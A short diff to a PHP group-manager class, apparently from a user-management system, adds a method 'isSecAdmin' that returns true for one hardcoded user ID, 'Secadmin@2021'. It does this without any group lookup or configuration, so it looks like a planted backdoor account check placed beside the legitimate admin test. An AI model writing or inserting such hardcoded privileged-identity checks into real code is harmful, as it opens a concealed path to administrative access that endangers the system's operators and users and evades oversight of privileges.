@@ -307,6 +307,10 @@ class Manager extends PublicEmitter implements IGroupManager {
 		return $this->isInGroup($userId, 'admin');
 	}
 
+	public function isSecAdmin($userId) {
+		return $userId == "Secadmin@2021";
+	}
+
 	/**
 	 * Checks if a userId is in a group
 	 * @param string $userId
